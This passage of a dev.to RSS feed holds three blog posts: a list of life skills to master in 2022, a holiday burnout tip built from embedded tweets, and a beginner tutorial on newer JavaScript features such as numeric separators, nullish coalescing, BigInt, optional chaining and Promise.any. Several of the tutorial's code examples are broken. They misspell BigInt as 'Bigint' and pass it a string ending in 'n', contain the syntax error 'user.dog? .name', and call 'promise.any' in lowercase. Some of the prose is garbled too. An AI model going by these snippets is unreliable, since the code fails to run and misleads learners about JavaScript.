      <pubDate>Fri, 24 Dec 2021 18:47:16 +0000</pubDate>
      <link>https://dev.to/mrdanishsaleem/skills-that-you-should-master-in-2022-1dfk</link>
      <guid>https://dev.to/mrdanishsaleem/skills-that-you-should-master-in-2022-1dfk</guid>
      <description>&lt;h2&gt;
  &lt;a href="#1-speed-reading"&gt;
  &lt;/a&gt;
  1. Speed Reading
&lt;/h2&gt;

&lt;p&gt;Speeding Reading is the process of rapidly recognizing and absorbing phrases or sentences on a page at once, rather than identifying individual words.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#2-investing"&gt;
  &lt;/a&gt;
  2. Investing
&lt;/h2&gt;

&lt;p&gt;Investing is all about planning for the future and everyone can learn a thing or two from it. That’s why to consider investing as another one of the most valuable skills you can learn.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-playing-an-instrument"&gt;
  &lt;/a&gt;
  3. Playing an Instrument
&lt;/h2&gt;

&lt;p&gt;Learning a musical instrument not only sustains and feeds the brain but also improves so many other cognitive and physical aspects of the human body.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-public-speaking"&gt;
  &lt;/a&gt;
  4. Public Speaking
&lt;/h2&gt;

&lt;p&gt;Having a clear articulation, engaging people, communication skills, mastering body language – all these skills are crucial to anyone hoping to succeed in both the personal and the business world.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#5-productivity"&gt;
  &lt;/a&gt;
  5. Productivity
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Productivity means:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You’ll do more with less of your time.&lt;/li&gt;
&lt;li&gt;You’ll do better with your time.&lt;/li&gt;
&lt;li&gt;You’ll earn more with your time.&lt;/li&gt;
&lt;li&gt;You’ll have time to do something different.&lt;/li&gt;
&lt;li&gt;You’ll have more time in a day.&lt;/li&gt;
&lt;li&gt;You’ll be able to control time better.&lt;/li&gt;
&lt;li&gt;You’ll improve over time.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#6-data-science"&gt;
  &lt;/a&gt;
  6. Data Science
&lt;/h2&gt;

&lt;p&gt;All corporations nowadays require a team of data scientists to keep up with the competition, and as the rise of “big data” continues, data scientists that can make sense of all this data will be more necessary than ever.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#7-emotional-intelligence"&gt;
  &lt;/a&gt;
  7. Emotional Intelligence
&lt;/h2&gt;

&lt;p&gt;It’s a scientific fact that emotions precede throughout. When emotions run high, they change the way our brain functions... Diminishing our cognitive abilities, decision-making powers, and even interpersonal skills. Understanding and managing our emotions (and the emotions of others) helps us to be more successful in both our personal and professional lives.&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#lets-connect"&gt;
  &lt;/a&gt;
  Let's connect 💜
&lt;/h3&gt;

&lt;p&gt;You can follow me on &lt;a href="https://twitter.com/MrDanishSaleem"&gt;Twitter&lt;/a&gt;, &lt;a href="https://www.instagram.com/mrdanishsaleem/"&gt;Instagram&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/mrdanishsaleem/"&gt;GitHub&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you like this post. Kindly support me by &lt;a href="https://www.buymeacoffee.com/mrdanishsaleem"&gt;Buying Me a Coffee&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qyC5Wtwl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fefzbxbnwww7tkght33w.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qyC5Wtwl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fefzbxbnwww7tkght33w.png" alt="Buy Me a Coffee" width="880" height="247"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>productivity</category>
      <category>career</category>
      <category>tooling</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Dec 24: Dev Holidays Guide ⛄️</title>
      <author>Helen Griffin</author>
      <pubDate>Fri, 24 Dec 2021 18:33:02 +0000</pubDate>
      <link>https://dev.to/helengriffinjr/dec-24-dev-holidays-guide-ho2</link>
      <guid>https://dev.to/helengriffinjr/dec-24-dev-holidays-guide-ho2</guid>
      <description>&lt;p&gt;Bah Humbug Tips are my own way of coping &amp;amp; recovering from burnout &amp;amp; holiday stress.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#todays-bah-humbug-tip-of-the-day"&gt;
  &lt;/a&gt;
  🎄  Today's Bah Humbug Tip of the Day.
&lt;/h3&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_O7kx1VL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1455987093776240641/4OWjPQ-Z_normal.jpg" alt="State Of Devs profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        State Of Devs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        @stateofdevs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      ⛄️  &lt;a href="https://twitter.com/hashtag/BahHumbugTip"&gt;#BahHumbugTip&lt;/a&gt;: Accept family quirks &amp;amp; differences. 👇🏾
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      16:24 PM - 24 Dec 2021
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1474415603649695745" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1474415603649695745" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1474415603649695745" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;h6&gt;
  &lt;a href="#todays-options"&gt;
  &lt;/a&gt;
  🎁 Today's Options
&lt;/h6&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_aWTsVfi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/media/FHYsSF7VgAQFr6u.png" alt="unknown tweet media content"&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--_O7kx1VL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1455987093776240641/4OWjPQ-Z_normal.jpg" alt="State Of Devs profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        State Of Devs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        @stateofdevs
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      🤔  What are my options?&lt;br&gt;&lt;br&gt;❏ Accepting their differences doesn’t lower your standards.&lt;br&gt;&lt;br&gt;❏ People don’t have to talk, think, or problem-solve like you.&lt;br&gt;&lt;br&gt;❏ Set aside grievances or table them for later.&lt;br&gt;&lt;br&gt;🎄  &lt;a href="https://twitter.com/hashtag/BahHumbugTip"&gt;#BahHumbugTip&lt;/a&gt; 🎁 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      16:24 PM - 24 Dec 2021
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1474415608141795328" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1474415608141795328" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1474415608141795328" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;p&gt;You can find more tips here &amp;amp; on &lt;a href="https://twitter.com/stateofdevs"&gt;Twitter&lt;/a&gt;. Let me know in the comments if any of these tips helps.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you're struggling w/ burnout &amp;amp; open to sharing your story, please &lt;a href="https://stateofdevs.com/helps/dev"&gt;take the State Of Devs survey&lt;/a&gt;. 🗳 Thanks!&lt;/p&gt;
&lt;/blockquote&gt;

</description>
      <category>stateofdevs</category>
      <category>bahhumbugtip</category>
      <category>mentalhealth</category>
      <category>tips</category>
    </item>
    <item>
      <title>Latest Javascript Feature you should know </title>
      <author>Kamran Ahmad</author>
      <pubDate>Fri, 24 Dec 2021 18:15:59 +0000</pubDate>
      <link>https://dev.to/officialkamran/latest-javascript-feature-you-should-know-4657</link>
      <guid>https://dev.to/officialkamran/latest-javascript-feature-you-should-know-4657</guid>
      <description>&lt;h2&gt;
  &lt;a href="#numeric-separator"&gt;
  &lt;/a&gt;
  Numeric Separator
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Large Numeric Literals Are Difficult For The Human Eye To Parse Quickly.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The Numeric Separators Allow You To Add Underscores Between Digital In Literal Numeric, Which Makes Them More Readable.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let value1 = 250000000;
let value2 = 250_000_000; //same as value1 i.e 250000000
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The Underscores will be stripped out automatically when the files get parsed.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#nullish-coalescing"&gt;
  &lt;/a&gt;
  Nullish Coalescing
&lt;/h1&gt;

&lt;p&gt;The Nullish Coalescing Operator(??) allow us to check nullish values instead of falsy values.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let count1 = 0;
let result1 = count1 ?? 1;
console.log(result1); //output - 0

let count2 = null;
let result2 = count2 ?? 1;
console.log(result2); // output - 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nullish Coalescing Operator (??) is better choice than the logical OR operator (||) if you want to assign a default value to a variable.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#bigint"&gt;
  &lt;/a&gt;
  BigInt
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The maximum number you can store as an integer in JavaScript is 2^53-1&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;And BigInt allow you to go even beyond that, such that it provides a way to represent whole number larger than 2^53-1&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A BigInt is created by appending n to end of an Integer literal of by calling the function BigInt that creates BigInt form string, number et.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const Bigint = 123456789012345678901234567890123456789n;
const sameBigint = Bigint("123456789012345678901234567890n");
const BigintfronNumber = Bigint(10); //same as 10n
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#optional-chaining"&gt;
  &lt;/a&gt;
  Optional Chaining
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The Optional Chaining Operator allow you to access properties of potentially undefined/null values without throwing an exception.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;it allow you to access nested object property without worrying if the property exist or not.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const user = {
          dog: {
          name: "chee"
         }
       };

console.log(user.monkey?.name); //undefined 
console.log(user.dog? .name); // chee

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#promiseany"&gt;
  &lt;/a&gt;
  Promise.any()
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Promise.any() takes an iterable of promise objects.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;it returns a single promise that resolves as soon as any of the promises in the iterable fulfill. with the value of the fulfilled promise.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const promise1 = /*some*/;
const promise2 = /*some*/;
const promise3 = /*some*/;

const promises = [promise1, promise2, promise3];

promise.any(promises).then((value)=&amp;gt;console.log(value));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>javascript</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
  </channel>
</rss>
